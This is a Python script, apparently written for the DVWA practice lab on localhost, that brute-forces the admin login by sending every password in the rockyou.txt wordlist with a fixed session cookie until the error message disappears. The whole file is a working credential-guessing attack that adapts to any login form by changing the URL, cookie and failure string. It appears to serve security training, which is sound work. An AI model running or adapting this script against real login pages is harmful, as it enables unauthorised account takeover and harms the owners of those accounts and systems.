import requests

url = "http://localhost/vulnerabilities/brute/"
username = "admin"

cookies = {
	"PHPSESSID":"dak923ushfn9vvbirkmsj9rhj0",
	"security":"low"
}

with open("/usr/share/wordlists/rockyou.txt","r",encoding="latin-1") as file:
	passwords=file.readlines()

for pwd in passwords:
	pwd=pwd.strip()
	payload = {
		"username": username,
		"password": pwd,
		"Login": "Login"
	}

	response = requests.get(url,params=payload, cookies=cookies)


	if "Username and/or password incorrect." not in response.text:
		print(f"\n Password Found: {pwd}")
		break
	else:
		print(f"[-] Tried: {pwd}")
